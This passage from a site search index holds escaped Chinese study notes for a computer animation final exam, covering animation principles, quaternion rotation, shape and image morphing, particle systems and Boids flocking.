X(T)\u3002\u5bf9\u6b64\uff0c\u6211\u4eec\u6709\u51e0\u4e2a\u7ea6\u675f\u6761\u4ef6\uff1a</p> <ol> <li>\u52a8\u529b\u5b66\u7ea6\u675f\uff1a \\(ma = mg + f(t)\\) ;</li> <li>\u4f4d\u7f6e\u7ea6\u675f\uff1a\u7c92\u5b50\u5728\u8fd0\u52a8\u65f6\u7684\u8d77\u70b9\u548c\u7ec8\u70b9 (pose to pose) ;</li> <li>\u76ee\u6807\u7ea6\u675f\uff1a\u7c92\u5b50\u8017\u80fd\u6700\u5c0f (\u4f7f\u7528\u6700\u5c11\u7684\u71c3\u6599/\u6700\u7701\u529b) </li> </ol> \\[\\min \\int^{T}_{t_0} ||f(t)||^2 dt\\] </li> </ul> </li> </ul>"}, {"location": "Course/Computer-Animation/FinalExam/", "title": "\u8003\u8bd5\u5927\u7eb2", "text": "<p> \u7ea6 1142 \u4e2a\u5b57  266 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <pre><code>\u4ec5\u4f9b\u53c2\u8003\n</code></pre>"}, {"location": "Course/Computer-Animation/FinalExam/#_2", "title": "\u9700\u8981\u638c\u63e1\u7684\u5185\u5bb9", "text": ""}, {"location": "Course/Computer-Animation/FinalExam/#_3", "title": "\u52a8\u753b\u4ecb\u7ecd", "text": "<p>1-\u8ba1\u7b97\u673a\u52a8\u753b\u7b80\u4ecb</p> <pre><code>title: \u52a8\u753b\u7684\u57fa\u672c\u77e5\u8bc6\n\n![](../../Images/2023-11-08-20-10-19.png)\n</code></pre> <pre><code>title: \u52a8\u753b\u5f62\u6210\u7684\u89c6\u89c9\u539f\u7406\n\n- \u6240\u8c13\u52a8\u753b\uff0c\u5c31\u662f\u6307\u901a\u8fc7\u4ee5\u6bcf\u79d2\u82e5\u5e72\u5e27\u7684\u901f\u5ea6\u987a\u5e8f\u5730\u64ad\u653e\u9759\u6b62\u56fe\u50cf\u5e27\u4ee5\u4ea7\u751f\u8fd0\u52a8\u9519\u89c9\u7684\u827a\u672f\u3002\n- &lt;u&gt;\u52a8\u753b\u5229\u7528\u4eba\u7684\u89c6\u89c9\u6b8b\u7559\u7279\u70b9\uff0c\u5373\u4e0a\u4e2a\u753b\u9762\u7684\u6b8b\u7559\u8fd8\u672a\u6d88\u5931\uff0c\u4e0b\u4e00\u4e2a\u753b\u9762\u53c8\u8fdb\u5165\u89c6\u89c9\uff0c\u8fd9\u6837\u5faa\u73af\u5f80\u590d\uff0c\u5728\u4eba\u7684\u773c\u4e2d\u5f62\u6210\u52a8\u6001\u7684\u753b\u9762\u3002&lt;/u&gt;\n</code></pre> <pre><code>title: \u4ec0\u4e48\u662f\u8ba1\u7b97\u673a\u52a8\u753b\n\n![](../../Images/2023-11-08-20-10-48.png)\n</code></pre>"}, {"location": "Course/Computer-Animation/FinalExam/#_4", "title": "\u52a8\u753b\u57fa\u672c\u539f\u5219", "text": "<p>2-\u52a8\u753b\u57fa\u672c\u539f\u5219</p> <pre><code>title: 12 \u6761\u57fa\u672c\u539f\u5219\n\n1. Squash and Stretch (\u6324\u538b\u548c\u4f38\u5c55)\n2. Anticipation\uff08\u9884\u671f\u6027\uff09\n3. Staging\uff08\u5e03\u5c40\uff09\n4. Straight-Ahead Action and Pose-to-Pose Action (\u8fde\u8d2f\u52a8\u4f5c\u6cd5\u4e0e\u5173\u952e\u52a8\u4f5c\u6cd5)\n5. Follow-Through and Overlapping Action (\u8ddf\u968f\u52a8\u4f5c\u4e0e\u91cd\u53e0\u52a8\u4f5c)\n6. Slow In and Slow Out (\u6162\u5165\u548c\u6162\u51fa)\n7. Arcs\uff08\u5f27\u5f62\u52a8\u4f5c\uff09\n8. Secondary Motion\uff08\u9644\u5c5e\u8fd0\u52a8\uff09\n9. Timing\uff08\u638c\u63e1\u65f6\u5e8f\uff09\n10. Exaggeration\uff08\u5938\u5f20\uff09\n11. &lt;font color=\"#7f7f7f\"&gt;Solid Drawing (not for 3D Animation)&lt;/font&gt;\n12. Appeal\uff08\u5438\u5f15\u529b\uff09\n\n&gt; \u884d\u751f\u89c4\u5219\uff1a\n&gt; 1. Depth of Field (\u666f\u6df1)\n&gt; 2. Balance &amp; Weight\uff08\u5e73\u8861\u53ca\u91cd\u91cf\u611f\uff09\n</code></pre>"}, {"location": "Course/Computer-Animation/FinalExam/#_5", "title": "\u53d8\u6362\u548c\u65cb\u8f6c\u8868\u793a", "text": "<pre><code>title: \u4e07\u5411\u8282\u6b7b\u9501\u7684\u6982\u5ff5\n\n![](../../Images/2023-11-08-20-11-18.png)\n![](../../Images/2023-11-08-20-11-38.png)\n![](../../Images/2023-11-08-20-11-53.png)\n</code></pre> <p>\u65cb\u8f6c\u7684\u56db\u5143\u6570\u8868\u793a</p> <p> </p> Math <p> </p> Advantages <ul> <li>Good and smooth interpolation</li> <li>No gimbal lock</li> <li>Can be composed much more efficiently (requiring 8 multiplications and 4 divices)</li> <li>But:<ul> <li>Impossible to visualize</li> <li>Unintutive</li> </ul> </li> <li>Good for internal representation of rotation!</li> </ul>"}, {"location": "Course/Computer-Animation/FinalExam/#_6", "title": "\u4e8c\u7ef4\u591a\u8fb9\u5f62\u5f62\u72b6\u6e10\u53d8", "text": "<ul> <li>\u5728\u4e8c\u7ef4\u89d2\u8272\u52a8\u753b\u4e2d\uff0c\u7ecf\u5e38\u4f1a\u78b0\u5230\u8fd9\u6837\u7684\u95ee\u9898\uff1a\u7ed9\u5b9a\u4e00\u4e2a\u521d\u59cb\u548c\u6700\u7ec8\u7684\u5f62\u72b6\uff08shape\uff09\uff0c\u6211\u4eec\u79f0\u5b83\u4eec\u4e3a\u5173\u952e\u5e27\u5f62\u72b6\uff0c\u6c42\u4ece\u521d\u59cb\u5f62\u72b6 \u5149\u6ed1\u8fc7\u6e21 \u5230\u6700\u7ec8\u5f62\u72b6\u7684 \u4e2d\u95f4\u5f62\u72b6</li> <li>\u8fd9\u4e2a\u95ee\u9898\u79f0\u4e3a\u4e8c\u7ef4\u5f62\u72b6\u7684\u81ea\u7136\u6e10\u53d8\uff08Shape Blending | Shape Morphing\uff09</li> </ul> <pre><code>title: 2D Shape Blending \u6d89\u53ca\u7684\u4e24\u4e2a\u5b50\u95ee\u9898\n\n1. \u9876\u70b9\u7684\u5bf9\u5e94\u5173\u7cfb\u95ee\u9898\n2. \u9876\u70b9\u7684\u63d2\u503c\u95ee\u9898\n</code></pre> <pre><code>title: \u57fa\u4e8e\u5185\u5728\u5f62\u72b6\u63d2\u503c\u7684\u591a\u8fb9\u5f62\u6e10\u53d8\u65b9\u6cd5\u7684\u57fa\u672c\u601d\u60f3\n\n\u5bf9\u5173\u952e\u5e27\u591a\u8fb9\u5f62\u7684 **\u8fb9\u957f\u548c\u9876\u70b9\u89d2** \u8fdb\u884c\u63d2\u503c\u3002\u6570\u5b66\u539f\u7406\u4e3a **\u4e4c\u9f9f\u51e0\u4f55\u4e0e\u62c9\u683c\u6717\u65e5\u4e58\u6570\u6cd5** \u4f18\u5316\u3002\uff08\u4f7f\u7528\u4e4c\u9f9f\u51e0\u4f55\u5bf9\u591a\u8fb9\u5f62\u8fdb\u884c\u5b9a\u4e49\uff0c\u901a\u8fc7\u63d2\u503c\u5f97\u5230\u4e2d\u95f4\u591a\u8fb9\u5f62\u7684\u8fb9\u957f\u548c\u9876\u70b9\u89d2\uff0c\u7531\u4e8e\u901a\u5e38\u4e0d\u5c01\u95ed\uff0c\u6240\u4ee5\u4fdd\u6301\u63d2\u503c\u7684\u9876\u70b9\u89d2\u4e0d\u53d8\uff0c\u4f7f\u7528\u62c9\u683c\u6717\u65e5\u4e58\u6570\u6cd5\u6765\u9002\u5f53\u8c03\u6574\u63d2\u503c\u5f97\u5230\u7684\u8fb9\u957f\u3002\uff09\n\n&gt; - \u6570\u5b66\u539f\u7406\uff1a\u4e4c\u9f9f\u51e0\u4f55 + Lagrange \u4e58\u6570\u6cd5\u4f18\u5316\n&gt; - \u901a\u8fc7\u9876\u70b9\u5904\u7684\u8fb9\u957f\u548c\u6709\u5411\u89d2\u6765\u5b9a\u4e49\u591a\u8fb9\u5f62\n&gt; - \u901a\u8fc7\u5bf9\u5173\u952e\u5e27\u591a\u8fb9\u5f62\u7684 **\u8fb9\u957f\u548c\u9876\u70b9\u89d2\u8fdb\u884c\u63d2\u503c** \u6765\u4ea7\u751f\u6bd4\u7ebf\u6027\u63d2\u503c\u66f4\u597d\u7684\u7ed3\u679c\n&gt; - \u62c9\u683c\u6717\u65e5\u4e58\u6570\u6cd5\u4f18\u5316\u7528\u4e8e\u5904\u7406\u63d2\u503c\u540e\u8d77\u59cb\u70b9\u548c\u7ec8\u6b62\u70b9\u4e0d\u5728\u540c\u4e00\u4f4d\u7f6e\u7684\u95ee\u9898\n</code></pre> <pre><code>title: Edge Tweaking \u601d\u60f3\n\n- \u4fdd\u6301\u63d2\u503c\u7684\u9876\u70b9\u89d2\u4e0d\u53d8\uff0c\u9002\u5f53\u8c03\u6574\u63d2\u503c\u5f97\u5230\u7684\u8fb9\u957f (\u89e3\u51b3\u4e2d\u95f4\u591a\u8fb9\u5f62\u4e0d\u5c01\u95ed\u7684\u95ee\u9898)\n\n&gt; \u8fd9\u662f\u4e00\u4e2a\u5177\u6709\u7ea6\u675f\u6761\u4ef6\u7684\u6781\u503c\u95ee\u9898\uff0c\u53ef\u4ee5\u7528\u62c9\u683c\u6717\u65e5\u4e58\u6570\u6cd5\u6c42\u89e3\n</code></pre>"}, {"location": "Course/Computer-Animation/FinalExam/#morphing", "title": "\u4e8c\u7ef4\u56fe\u50cf Morphing", "text": "<pre><code>title: \u56fe\u50cf morphing \u601d\u60f3\n\n- \u9996\u5148\u7528\u7b80\u5355\u7684\u51e0\u4f55\u5143\u5efa\u7acb\u56fe\u50cf\u7279\u5f81\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u7136\u540e\u7531\u8fd9\u4e9b\u7279\u5f81\u5bf9\u5e94\u5173\u7cfb\u8ba1\u7b97\u51fa morphing \u6240\u9700\u7684\u51e0\u4f55\u53d8\u6362\uff0c\u51e0\u4f55\u53d8\u6362\u5b9a\u4e49\u4e86\u4e24\u5e45\u56fe\u50cf\u4e0a\u70b9\u4e4b\u95f4\u7684\u51e0\u4f55\u5bf9\u5e94\u5173\u7cfb\u3002\n- \u6ee1\u5c04 C0 \u628a\u7b2c\u4e00\u5e45\u56fe\u50cf\u7684\u51e0\u4f55\u5f62\u72b6\u6620\u5c04\u4e3a\u7b2c\u4e8c\u5e45\u56fe\u50cf\u7684\u51e0\u4f55\u5f62\u72b6\uff0c\u6ee1\u5c04 C1 \u5219\u53cd\u8fc7\u6765\u3002\u9700\u8981\u4e24\u4e2a\u6620\u5c04\u7684\u539f\u56e0\u662f\u56fe\u50cf\u70b9\u4e0e\u70b9\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\u4e0d\u4e00\u5b9a\u662f\u4e00\u4e00\u5bf9\u5e94\u3002\n- \u56fe\u50cf\u53d8\u5f62\u5bf9\u9f50\u540e\u518d\u5bf9\u989c\u8272\u8fdb\u884c\u63d2\u503c\uff0c\u5f97\u5230\u4e2d\u95f4\u5e27\u56fe\u50cf\u3002\n</code></pre> <pre><code>title: \u57fa\u4e8e\u7f51\u683c\u7684\u56fe\u50cf morphing \u539f\u7406\n\n- \u5728\u6e90\u56fe\u50cf\u4e2d\uff0c\u653e\u7f6e\u66f2\u9762\u7f51\u683c Ms\uff0cMs \u6307\u5b9a\u4e86\u63a7\u5236\u9876\u70b9\u7684\u5750\u6807\u3002\u5728\u76ee\u6807\u56fe\u50cf\u4e2d\uff0c\u653e\u7f6e\u7f51\u683c Md\uff0cMd \u6307\u5b9a\u4e86 Ms \u5728\u76ee\u6807\u56fe\u50cf\u7684\u5bf9\u5e94\u70b9\u3002\n- \u66f2\u9762 Ms \u548c Md \u7528\u6765\u5b9a\u4e49\u628a\u6e90\u56fe\u50cf\u7684\u6240\u6709\u70b9\u6620\u5c04\u5230\u76ee\u6807\u56fe\u50cf\u7684\u7a7a\u95f4\u53d8\u6362\uff0c\u5b83\u4eec\u7684\u62d3\u6251\u5173\u7cfb\u76f8\u540c\u3002\n- \u4e2d\u95f4\u5e27\u7684\u56fe\u50cf\u751f\u6210\u6b65\u9aa4\uff1a\n    1. \u7ebf\u6027\u63d2\u503c\u7f51\u683c Ms \u548c Md\uff0c\u5f97\u5230\u7f51\u683c M\n    2. \u5e94\u7528\u7531\u7f51\u683c Ms \u548c M \u5b9a\u4e49\u7684\u53d8\u6362\uff0c\u4f7f\u6e90\u56fe\u50cf Is \u626d\u66f2\u53d8\u5f62\u5230 I0\n    3. \u5e94\u7528\u7531\u7f51\u683c Md \u548c M \u5b9a\u4e49\u7684\u53d8\u6362\uff0c\u4f7f\u76ee\u6807\u56fe\u50cf Id \u53d8\u5f62\u5230 I1\n    4. \u5bf9\u56fe\u50cf I0 \u548c I1 \u8fdb\u884c\u7ebf\u6027\u63d2\u503c\uff0c\u5f97\u5230\u4e2d\u95f4\u5e27\u56fe\u50cf\n</code></pre> <pre><code>title: \u57fa\u4e8e\u7ebf\u5bf9\u7684\u56fe\u8c61 morphing \u65b9\u6cd5\n\n- \u91c7\u7528\u9006\u5411\u6620\u5c04\uff1a\u9010\u4e2a\u626b\u63cf\u76ee\u6807\u56fe\u50cf\u7684\u50cf\u7d20\uff0c\u6839\u636e\u5176\u4f4d\u7f6e\u91c7\u6837\u6e90\u56fe\u50cf\u3002\n- \u5728\u6e90\u56fe\u50cf\u4e2d\u5b9a\u4e49\u4e00\u6761\u6709\u5411\u7ebf\u6bb5\uff0c\u518d\u5728\u76ee\u6807\u56fe\u50cf\u4e2d\u5b9a\u4e49\u4e00\u6761\u6709\u5411\u7ebf\u6bb5\uff0c\u5219\u6620\u5c04\u628a\u4e00\u6761\u76f4\u7ebf\u6620\u5c04\u4e3a\u53e6\u4e00\u6761\u76f4\u7ebf\u3002\n- \u8bbe\u4e24\u5e45\u56fe\u50cf\u5206\u522b\u4e3a Is \u548c Id\uff0c\u5148\u5728\u4e24\u5e45\u56fe\u50cf\u4e2d\u5b9a\u4e49\u63a7\u5236\u53d8\u5f62\u7684\u5bf9\u5e94\u76f4\u7ebf\u5bf9\uff0c\u901a\u8fc7\u63d2\u503c\u5f97\u5230\u4e2d\u95f4\u56fe\u50cf I \u7684\u76f4\u7ebf\u3002\u7531 Is-&gt;I \u7684\u76f4\u7ebf\u5bf9\u53d8\u6362\u53ef\u4ee5\u5f97\u5230\u4e00\u526f\u53d8\u5f62\u56fe I1\uff0c\u7531 Id-&gt;I \u7684\u76f4\u7ebf\u5bf9\u53d8\u6362\u53ef\u4ee5\u5f97\u5230 I2\u3002\u5bf9\u4ea4\u6eb6\u53c2\u6570\u4f5c\u52a8\u753b\uff0c\u628a I1 \u548c I2 \u8fdb\u884c\u4ea4\u6eb6\u5904\u7406\u53ef\u4ee5\u5f97\u5230\u4e2d\u95f4\u7684\u53d8\u5f62\u56fe\u50cf I\n</code></pre>"}, {"location": "Course/Computer-Animation/FinalExam/#morphing_1", "title": "\u4e09\u7ef4 Morphing \u6280\u672f", "text": "<pre><code>title: \u4e8c\u3001\u4e09\u7ef4\u5f62\u72b6\u6e10\u53d8 (morphing) \u5404\u6709\u4ec0\u4e48\u4f18\u7f3a\u70b9\uff1f\n\n- \u4e8c\u7ef4\uff1a\n    - \u4f18\u70b9\uff1a\u662f\u4e00\u79cd\u8fbe\u5230\u7279\u6b8a\u89c6\u89c9\u6548\u679c\u7684\u6709\u6548\u65b9\u6cd5\uff1b\u53ef\u4ee5\u8ba9\u4eba\u4ea7\u751f\u795e\u5947\u7684\u4e09\u7ef4\u5f62\u72b6\u6539\u53d8\u7684\u9519\u89c9\uff0c\u53ef\u4ee5\u907f\u514d\u590d\u6742\u7684\u4e09\u7ef4\u9020\u578b\u8fc7\u7a0b\n    - \u7f3a\u70b9\uff1a\u53ef\u80fd\u751f\u6210\u4e00\u4e9b\u610f\u6599\u4e4b\u5916\u7684\u56fe\u50cf\uff08\u7ebf\u5bf9\u7279\u5f81\u6cd5\uff09\uff1b\u7269\u4f53\u6ca1\u6709\u4e09\u7ef4\u51e0\u4f55\u4fe1\u606f\uff0c\u4e0d\u80fd\u8fdb\u884c\u51e0\u4f55\u53d8\u6362\n- \u4e09\u7ef4\uff1a\n    - \u4f18\u70b9\uff1a\u80fd\u751f\u6210\u66f4\u903c\u771f\u548c\u751f\u52a8\u7684\u7279\u6280\u6548\u679c\uff0c\u4e14\u5f97\u5230\u7684\u4e2d\u95f4\u5e27\u662f\u7269\u4f53\u7684\u6a21\u578b\u800c\u4e0d\u662f\u56fe\u50cf\uff0c\u8fd0\u7528\u8303\u56f4\u66f4\u5e7f\n    - \u7f3a\u70b9\uff1a\u7269\u4f53\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\u5f88\u96be\u5efa\u7acb\uff0c\u800c\u4e14\u8be5\u65b9\u6cd5\u5bf9\u7269\u4f53\u7684\u51e0\u4f55\u8868\u793a\u4e5f\u76f8\u5f53\u82db\u523b\n</code></pre> <pre><code>title: \u57fa\u4e8e\u661f\u5f62\u7269\u4f53\u7684\u591a\u9762\u4f53 morphing \u65b9\u6cd5\n\n- \u5408\u5e76\u4e00\u5bf9\u4e09\u7ef4\u591a\u9762\u4f53\u7269\u4f53\u6a21\u578b\u7684\u62d3\u6251\u7ed3\u6784\uff0c\u4f7f\u5b83\u4eec\u62e5\u6709\u76f8\u540c\u7684\u9876\u70b9\uff0c\u8fb9\uff0c\u9762\u7f51\u7edc\u7ed3\u6784\uff0c\u7136\u540e\u5bf9\u76f8\u5e94\u7684\u9876\u70b9\u8fdb\u884c\u63d2\u503c\n- \u901a\u8fc7\u5408\u5e76\u62d3\u6251\u7ed3\u6784\u5c06\u4e00\u4e2a\u7269\u4f53\u7684\u5f62\u72b6\u53d8\u6362\u4e3a\u53e6\u4e00\u4e2a\u7269\u4f53\u7684\u5f62\u72b6\u53ef\u4ee5\u5206\u4e3a\u4e24\u6b65\uff1a\n    1. \u5efa\u7acb\u6e90\u7269\u4f53\u4e0e\u76ee\u6807\u7269\u4f53\u4e0a\u7684\u70b9\u7684\u5bf9\u5e94\u5173\u7cfb\uff08\u5bf9\u5e94\u95ee\u9898\uff09\n    2. \u63d2\u503c\u5bf9\u5e94\u7684\u70b9\uff08\u63d2\u503c\u95ee\u9898\uff09\n- \u5bf9\u4e8e\u4e8f\u683c\u4e3a\u96f6\u7684\u4e24\u4e2a\u591a\u9762\u4f53\uff0c\u53ef\u91c7\u53d6\u4e0b\u9762\u7684\u4e09\u4e2a\u6b65\u9aa4\u6765\u5efa\u7acb\u4e8f\u683c\u4e3a\u96f6\u7684\u591a\u9762\u4f53\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\uff1a\n    1. \u628a\u4e24\u4e2a\u591a\u9762\u4f53\u6295\u5f71\u5230\u5355\u4f4d\u7403\u9762\u4e0a\n    2. \u5c06\u6295\u5f71\u5728\u5355\u4f4d\u7403\u9762\u4e0a\u7684\u4e24\u4e2a\u62d3\u6251\u7ed3\u6784\u5408\u5e76\u5728\u4e00\u8d77\u6784\u6210\u4e00\u4e2a\u65b0\u7684\u62d3\u6251\u7ed3\u6784\n    3. \u5c06\u65b0\u7684\u62d3\u6251\u7ed3\u6784\u6620\u5c04\u56de\u539f\u6765\u7684\u4e24\u4e2a\u591a\u9762\u4f53\n\n![](../../Images/2023-11-08-20-14-41.png)\n\n- \u4e00\u65e6\u9876\u70b9\u5bf9\u5e94\u5173\u7cfb\u5efa\u7acb\u4ee5\u540e\uff0c\u901a\u5e38\u91c7\u7528\u7ebf\u6027\u63d2\u503c\u6216 Hermite \u63d2\u503c\u6765\u63d2\u503c\u76f8\u5e94\u7684\u9876\u70b9\n</code></pre> <pre><code>title: \u57fa\u4e8e\u4f53\u8868\u793a\u7684\u4e09\u7ef4 morphing \u65b9\u6cd5\n\n- \u601d\u60f3\uff1a\u7ed9\u5b9a\u6e90\u4f53 S \u548c\u76ee\u6807\u4f53 T\uff0c\u9996\u5148\u6839\u636e\u6307\u5b9a\u7684\u5bf9\u5e94\u7279\u5f81\u751f\u6210\u4e00\u7a7a\u95f4\u53d8\u6362\uff0c\u8be5\u53d8\u6362\u4f7f\u7ed9\u5b9a\u7684\u4e24\u4e2a\u4f53\u626d\u66f2\u53d8\u5f62\u6210 S\u2019 \u548c T\u2019\uff0c\u8fbe\u5230\u51e0\u4f55\u5bf9\u9f50\u7684\u76ee\u7684\uff1b\u7136\u540e\u5bf9\u5f97\u5230\u7684\u4e24\u4e2a\u626d\u66f2\u53d8\u5f62\u4f53 S\u2019 \u548c T\u2019 \u8fdb\u884c\u6df7\u5408\u3002\n- \u5f53 Warping \u64cd\u4f5c\u751f\u6210\u4e24\u4e2a\u626d\u66f2\u53d8\u5f62\u7684\u4f53\u548c\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u591a\u79cd\u65b9\u6cd5\u5bf9\u5b83\u4eec\u8fdb\u884c\u6df7\u5408\n    - \u5148\u5bf9S\u2019 \u548c T\u2019 \u8fdb\u884c\u4f53\u7ed8\u5236\uff0c\u7136\u540e\u628a\u7ed8\u5236\u597d\u7684\u56fe\u8c61\u8fdb\u884c\u4ea4\u6eb6\u5904\u7406\u3002\u8be5\u65b9\u6cd5\u7684\u7f3a\u70b9\u662f\u751f\u6210\u7ed3\u679c\u7684\u5149\u7167\u548c\u906e\u6321\u60c5\u51b5\u4e0d\u6b63\u786e\uff0c\u4e14\u7f3a\u4e4f\u771f\u5b9e\u7684\u4e09\u7ef4 morphing \u6548\u679c\n    - \u5bf9 S\u2019 \u548c T\u2019 \u4f53\u7d20\u7684\u989c\u8272\u548c\u4e0d\u900f\u660e\u5ea6\u503c\u8fdb\u884c\u4ea4\u6eb6\u5904\u7406\uff0c\u7136\u540e\u5bf9\u6df7\u5408\u540e\u7684\u4f53\u7d20\u8fdb\u884c\u4f53\u7ed8\u5236 (volume rendering)\u3002\u901a\u5e38\uff0c\u540e\u4e00\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5f97\u5230\u66f4\u597d\u7684\u4e09\u7ef4 morphing \u6548\u679c\n- \u4f18\u70b9\uff1a\u4e0e\u7269\u4f53\u7684\u51e0\u4f55\u548c\u62d3\u6251\u7ed3\u6784\u65e0\u5173\uff1b\u63d0\u4f9b\u4e86\u4e00\u79cd\u7edf\u4e00\u7684\u5904\u7406\u65b9\u6cd5\uff08\u51e0\u4f55\u8868\u793a\u7684\u7269\u4f53\u90fd\u53ef\u4ee5\u8f6c\u5316\u6210\u4f53\u8868\u793a\uff09\u3002\u00a0  \n- \u7f3a\u70b9\uff1a\u8d70\u6837\u73b0\u8c61\u4e25\u91cd\uff0c\u7cbe\u5ea6\u6ca1\u6709\u57fa\u4e8e\u51e0\u4f55\u8868\u793a\u7684\u597d\uff1b\u51e0\u4f55\u6a21\u578b\u8f6c\u6362\u4e3a\u4f53\u7d20\u8868\u793a\u7684\u8ba1\u7b97\u65f6\u95f4\u8f83\u8d39\u3002\n</code></pre>"}, {"location": "Course/Computer-Animation/FinalExam/#_7", "title": "\u7c92\u5b50\u7cfb\u7edf", "text": "<pre><code>title: \u7c92\u5b50\u7cfb\u7edf\u7684\u57fa\u672c\u539f\u7406\n\n- \u7c92\u5b50\u7cfb\u7edf\u7684\u4f5c\u7528\uff1a\u6a21\u62df\u4e0d\u89c4\u5219\u81ea\u7136\u666f\u7269\u751f\u6210\u548c\u52a8\u753b\u7684\u7cfb\u7edf\uff0c\u4f7f\u9020\u578b\u548c\u52a8\u753b\u5de7\u5999\u5730\u8fde\u6210\u4e00\u4f53\n- \u7c92\u5b50\u7cfb\u7edf\u57fa\u4e8e\u7684\u5047\u8bbe\uff1a\n    1. \u7c92\u5b50\u4e00\u822c\u4e0d\u4e0e\u5176\u5b83\u7c92\u5b50\u78b0\u649e\n    2. \u9664\u975e\u5904\u4e8e\u805a\u96c6\u72b6\u6001\uff0c\u7c92\u5b50\u4e0d\u5411\u5176\u5b83\u7c92\u5b50\u6295\u5f71\n    3. \u7c92\u5b50\u53ea\u5411\u5176\u5b83\u73af\u5883\u6295\u5f71\n    4. \u7c92\u5b50\u4e0d\u53cd\u5c04\u5149\n    5. \u7c92\u5b50\u901a\u5e38\u6709\u6709\u9650\u7684\u751f\u547d\u5468\u671f\n- **\u7c92\u5b50\u7cfb\u7edf\u7684\u57fa\u672c\u601d\u60f3** \u662f\u5c06\u8bb8\u591a\u7b80\u5355\u5f62\u72b6\u7684\u5fae\u5c0f\u7c92\u5b50\u4f5c\u4e3a\u57fa\u672c\u5143\u7d20\u805a\u96c6\u8d77\u6765\u5f62\u6210\u4e00\u4e2a\u4e0d\u89c4\u5219\u6a21\u7cca\u7269\u4f53\u3002\u6bcf\u4e2a\u7c92\u5b50\u5747\u7ecf\u5386\u51fa\u751f\uff0c\u6210\u957f\uff0c\u8870\u8001\u548c\u6b7b\u4ea1\u7684\u8fc7\u7a0b\u3002\u751f\u6210\u7c92\u5b50\u7cfb\u7edf\u7684\u67d0\u4e00\u5e27\u753b\u9762\u7684\u57fa\u672c\u6b65\u9aa4\u662f\uff1a\n    1. \u751f\u6210\u65b0\u7684\u7c92\u5b50\u5e76\u52a0\u5165\u7cfb\u7edf\u4e2d\n    2. \u8d4b\u4e88\u65b0\u7c92\u5b50\u4e00\u5b9a\u7684\u5c5e\u6027\n    3. \u5220\u9664\u5df2\u7ecf\u8d85\u8fc7\u751f\u547d\u5468\u671f\u7684\u7c92\u5b50\n    4. \u6839\u636e\u7c92\u5b50\u7684\u52a8\u6001\u5c5e\u6027\u5bf9\u7c92\u5b50\u8fdb\u884c\u79fb\u52a8\u548c\u53d8\u6362\n    5. \u7ed8\u5236\u5e76\u663e\u793a\u7531\u6709\u751f\u547d\u7684\u7c92\u5b50\u7ec4\u6210\u7684\u56fe\u5f62\n- \u7c92\u5b50\u7684\u751f\u6210\uff1a\u5bf9\u4e8e\u6bcf\u4e00\u5e27\uff0c\u6839\u636e\u4e00\u4e2a\u63a7\u5236\u7684\u968f\u673a\u8fc7\u7a0b\u751f\u6210\u7c92\u5b50\n    - \u7528\u6237\u53ef\u4ee5\u63a7\u5236\u6bcf\u5e27\u7684\u5e73\u5747\u7c92\u5b50\u6570\u548c\u5176\u6982\u7387\u5206\u5e03\uff1b\n    - \u7c92\u5b50\u6570\u53ef\u4ee5\u662f\u65f6\u95f4\u7684\u51fd\u6570\u3002\n- \u7c92\u5b50\u7684\u5c5e\u6027\uff1a\u4f4d\u7f6e\uff0c\u901f\u5ea6\uff0c\u5927\u5c0f\uff0c\u5468\u671f\uff0c\u8d28\u91cf\uff0c\u529b\u52a0\u901f\u5668\uff0c\u751f\u547d\u5468\u671f\uff0c\u7ed8\u5236\u5c5e\u6027\u2026\u2026\n</code></pre>"}, {"location": "Course/Computer-Animation/FinalExam/#_8", "title": "\u7fa4\u7ec4\u52a8\u753b", "text": "<pre><code>title: Boids \u6a21\u578b\u7684\u4e09\u6761\u539f\u5219\uff0c\u6bcf\u6761\u539f\u5219\u7684\u542b\u4e49\n\n1. \u78b0\u649e\u907f\u514d\u539f\u5219\uff1a\u907f\u514d\u4e0e\u76f8\u90bb\u7684\u7fa4\u4f53\u6210\u5458\u76f8\u78b0\u00a0  \n2. \u901f\u5ea6\u5339\u914d\u539f\u5219\uff1a\u5c3d\u91cf\u4fdd\u6301\u4e0e\u5468\u56f4\u90bb\u5c45\u7fa4\u4f53\u6210\u5458\u7684\u901f\u5ea6\u5339\u914d\u00a0  \n3. \u7fa4\u4f53\u5408\u7fa4\u539f\u5219\uff1a\u7fa4\u4f53\u6210\u5458\u5c3d\u91cf\u9760\u8fd1\n</code></pre> <pre><code>title: Reynolds \u5bfc\u822a\u65b9\u6cd5\u4e2d\u7684\u8ffd\u9010\u548c\u8eb2\u907f\u6a21\u578b\u3001\u969c\u788d\u907f\u514d\u6a21\u578b\u3001 \u8def\u5f84\u8ddf\u968f\u3001\u6d41\u573a\u8ddf\u968f\u884c\u4e3a\u6a21\u578b\u3001\u9886\u5bfc\u6a21\u578b\n\n- \u8ffd\u9010\u548c\u8eb2\u907f\u6a21\u578b:\n    - \u8ffd\u9010\u4e00\u4e2a\u79fb\u52a8\u7684\u89d2\u8272\u3002  \n    - \u5047\u8bbe\u730e\u7269\u5728\u9884\u6d4b\u533a\u95f4 T \u5185\u4e0d\u4f1a\u8f6c\u5411\u3002  \n    - \u730e\u7269\u5728\u5c06\u6765\u7684\u4f4d\u7f6e\u53ef\u901a\u8fc7\u628a\u5b83\u7684\u5f53\u524d\u901f\u5ea6\u4e58\u4ee5T\uff0c\u5e76\u628a\u8be5\u504f\u79fb\u91cf\u4e0e\u5f53\u524d\u4f4d\u7f6e\u76f8\u52a0\u6765\u5f97\u5230\n\n&gt; ![](../../Images/2023-11-08-20-14-56.png)\n\n- \u969c\u788d\u907f\u514d\u6a21\u578b: \u8fd4\u56de\u907f\u514d\u6700\u6709\u5a01\u80c1\u969c\u788d\u7269\u7684\u5bfc\u822a\u503c\uff1b\u5982\u679c\u6ca1\u6709\u78b0\u649e\u662f\u8feb\u5728\u7709\u776b\u7684\uff0c\u8fd4\u56de\u4e00\u4e2a\u7279\u6b8a\u503c\uff08\u7a7a\u503c\uff0c\u6216\u96f6\u5411\u91cf\uff09\uff0c\u8868\u793a\u5728\u8fd9\u4e00\u65f6\u523b\u4e0d\u9700\u8981\u7ea0\u6b63\u91cf\n\n&gt; ![](../../Images/2023-11-08-20-15-04.png)\n\n- 